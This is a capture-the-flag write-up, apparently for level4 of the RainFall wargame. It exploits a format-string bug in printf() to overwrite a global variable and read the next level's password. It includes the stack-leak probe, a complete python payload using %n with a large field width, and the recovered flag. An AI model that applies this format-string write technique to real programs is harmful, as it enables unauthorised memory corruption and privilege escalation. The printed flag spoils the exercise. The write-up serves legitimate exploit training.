This exercise is basically the same as for the previous level. We must set a global variable to a specific value so that the program displays the content of the /home/level5/.pass file. To do this, we can again exploit a badly formatted printf().

The global variable we want to reach is at 0x8049810 and must be equal to 0x1025544 (=16930116) (check the [source.c file](source.c) for more details).

Let's first find the offset of the buffer in the stack:
```
level4@RainFall:~$ ./level4 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff774 b7fd0ff4 0 0 bffff738 804848d bffff530 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
```
Ok so the offest of the buffer in the stack is 12.

Now about the lenght of our input, it is clear that we cannot give an input of 16930116 bytes since fgets expects only 512 bytes. What we can do is give a %d modifier with a specified field width of 16930112 (16930116 minus the four bytes of the address of the buffer on the stack). This way, our input fits into the buffer and will be interpreted by printf().

```
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
...
printing 16930112 spaces twice, so it's a bit long...
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
We can now reach to the next level with the command `su level5` and fill in the flag found as a password.